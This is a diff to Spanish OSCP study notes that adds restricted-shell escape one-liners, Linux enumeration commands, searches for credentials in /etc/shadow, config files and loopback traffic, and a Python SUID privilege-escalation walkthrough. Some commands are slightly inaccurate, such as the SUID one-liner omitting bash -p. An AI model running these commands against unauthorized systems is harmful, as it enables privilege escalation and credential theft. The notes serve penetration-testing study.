@@ -142,6 +142,41 @@ Apuntes para la certicación OSCP.
 crunch 6 6 -t Lab%%% > wordlist
 ```
 
+### Escapar de una Restricted Shell
+
+```bash
+ssh user@10.0.0.3 -t "/bin/sh"
+ssh user@10.0.0.3 -t "bash --noprofile"
+ssh user@10.0.0.3 -t "(){:;}; /bin/bash"
+
+# Vim
+:set shell=/bin/bash
+:shell
+
+# more, less, man, ftp, gdb
+'! /bin/sh'
+'!/bin/sh'
+'!bash'
+
+# AWK
+awk 'BEGIN {system("/bin/sh")}'
+
+# Find
+find / -name offsec -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
+
+# Python
+exit_code = os.system('/bin/sh') output = os.popen('/bin/sh').read()
+
+# Perl
+exec "/bin/sh";
+
+# Ruby
+exec "/bin/sh"
+
+# Lua
+os.execute('/bin/sh')
+```
+
 ###  1.3. <a name='windows'></a>Windows
 
 ####  1.3.1. <a name='habilitar-winrm'></a>Habilitar WinRM
@@ -2435,14 +2470,18 @@ También podemos utilizar `SeTakeOwnershipPrivilege` para modificar la propiedad
 hostname
 hostname -I
 uname -a
+w
+lastlog
 cat /etc/issue
 cat /etc/os-release
 cat /proc/version
 cat /etc/shells
+sudo -V
 ps aux
-dpkg -l
+df -h
 mount
 cat /etc/fstab
+cat /etc/fstab | grep -v "#" | column -t
 lscpu
 lsblk
 lsmod
@@ -2461,6 +2500,7 @@ ip neigh
 ss -anp
 netstat -net
 netstat -ano
+cat /etc/hosts
 cat /etc/iptables/rules.v4
 ```
 
@@ -2474,11 +2514,23 @@ history
 cat .bashrc
 cat /etc/passwd
 cat /etc/passwd | grep "sh$"
-cat /etc/passwd | grep "sh$" | awk '{print $1}' FS=":"
+grep "sh$" /etc/passwd | awk '{print $1}' FS=":"
 cat /etc/shadow
 cat /etc/group
+getent group sudo
 sudo -l
 ```
+
+###### Algoritmos más utilizados
+
+| Algoritmo | Hash |
+| --------- | ---- |
+| Salted MD5 | $1$... |
+| SHA-256 | $5$... |
+| SHA-512 | $6$... |
+| BCrypt | $2a$... |
+| Scrypt | $7$... |
+| Argon2 | $argon2i$... |
 
 ##### Tareas Cron
 
@@ -2498,23 +2550,41 @@ ls -lah /etc/cron*
 ##### Archivos y Directorios
 
 ```bash
+ls -l /tmp /var/tmp /dev/shm
 find / -writable -type f 2>/dev/null
 find / -writable -type d 2>/dev/null
 find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
+find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"
+find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep student
+find / -type d -name ".*" -ls 2>/dev/null
+find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
 ```
 
 ##### Búsqueda de credenciales
 
 ```bash
 locate password | more
+find / type f -name wp-config.php -exec grep -E "DB_PASSWORD|DB_USER|DB_NAME" {} \; 2>/dev/null
+find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
 find / -name password 2>/dev/null -exec ls -l {} \; 2> /dev/null
 find . -type f -exec grep -i -I "PASSWORD" {} /dev/null
 grep -rnw '/' -ie "PASSWORD" –color=always 2>/dev/null
 ```
-
-##### Servicios
+##### Binarios y Paquetes instalados
 
 ```bash
+dpkg -l
+apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
+ls -l /bin /usr/bin/ /usr/sbin/
+```
+
+##### Procesos y Servicios
+
+```bash
+strace
+ps aux | grep root
+find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"
 watch -n 1 "ps -aux | grep pass"
 sudo tcpdump -i lo -A | grep "pass"
 ```
@@ -2553,6 +2623,70 @@ su - root2
 > Referencias: https://gtfobins.github.io/
 
 ##### SUID
+
+**Set User ID (SUID)** es un permiso especial en sistemas Unix/Linux. Cuando un archivo tiene el bit SUID establecido, permite que se ejecute con los privilegios de su propietario, independientemente del usuario que lo ejecute. Se suele utilizar para otorgar a usuarios normales permisos elevados temporales para ejecutar tareas específicas.
+
+![SUID](./img/suid.png)
+
+Indicado por `rws` para el permiso del propietario. Cuando el bit SUID (Set User ID) está activado (representado por una `s` en lugar de una `x` en el permiso de ejecución), cualquier usuario que ejecute este archivo lo hará con los permisos del propietario del archivo. Esto se utiliza comúnmente cuando un archivo es propiedad de root, pero permite que usuarios regulares lo ejecuten con privilegios de superusuario.
+
+Los siguientes tres caracteres (`rws`) representan los permisos para el grupo propietario del archivo. Al igual que con los permisos del propietario, se otorgan o deniegan los permisos de lectura (`r`), escritura (`w`) y ejecución (`x`) para el grupo. Cuando el bit GUID (Set Group ID) está activado, el bit de ejecución (`x`) para el grupo se reemplaza por una `s`, lo que indica que el archivo se ejecutará con los privilegios del grupo propietario.
+
+El GUID es similar al SUID, pero se aplica al grupo. Permite que cualquier usuario que ejecute el archivo lo haga con los permisos del grupo propietario. En este ejemplo, el permiso del grupo incluye una `s`, lo que muestra que el bit GUID está activado.
+
+###### Cómo identificar archivos SUID 
+
+Los archivos SUID se pueden identificar buscando archivos con el bit `s` en el campo de permiso de ejecución del propietario. 
+
+```bash
+find / -perm -4000 2>/dev/null
+```
+
+Ejemplo:
+
+```bash
+-rwsr-xr-x 1 root root /usr/bin/passwd
+```
+
+En este ejemplo:
+
+- `rws`: Indica que el bit SUID está establecido.
+- El propietario es `root`, lo que significa que cualquier usuario que ejecute este archivo lo hace con privilegios de `root`.
+
+###### Cómo explotar binarios SUID para escalar privilegios. 
+
+Algunos binarios esenciales en sistemas Linux, como su, sudo y passwd, suelen tener el bit SUID activado por defecto. Estos binarios son fundamentales para el funcionamiento del sistema y, en general, se consideran seguros. Sin embargo, el riesgo de vulnerabilidades aumenta cuando se trata de binarios de terceros o menos comunes. Para identificar posibles métodos de explotación, una excelente primera aproximación es consultar [GTFObins](https://gtfobins.github.io/), un recurso invaluable que recopila técnicas para aprovechar binarios con permisos especiales, como **SUID**.
+
+[GTFOBins SUID](https://gtfobins.github.io/#+suid)
+
+Por ejemplo, si el bit SUID está habilitado en un binario como Python, es posible explotarlo para escalar privilegios en el sistema. A continuación, se describe un caso práctico:
+
+**Verificar si Python tiene el bit SUID activado**
+
+Para comprobar si Python tiene el bit SUID configurado, ejecuta el siguiente comando:
+
+```bash
+ls -l /usr/bin/python
+```
+
+Si el bit SUID está activado, verás una salida similar a esta:
+
+```bash
+-rwsr-xr-x 1 root root /usr/bin/python
+```
+
+La `s` en los permisos del propietario (rws) indica que el bit SUID está habilitado.
+
+**Explotar Python para escalar privilegios**
+
+Si Python tiene el bit SUID activado, podemos ejecutar una línea de código para obtener una shell con privilegios de root:
+
+```bash
+/usr/bin/python -c 'import os; os.execl("/bin/bash", "bash", "-i")'
+```
+
+Este comando utiliza Python para lanzar una shell interactiva (`/bin/bash`) con los permisos del propietario del archivo, en este caso, `root`.
+
 ##### Sudo
 ##### Capabilities
 ##### Tareas Cron
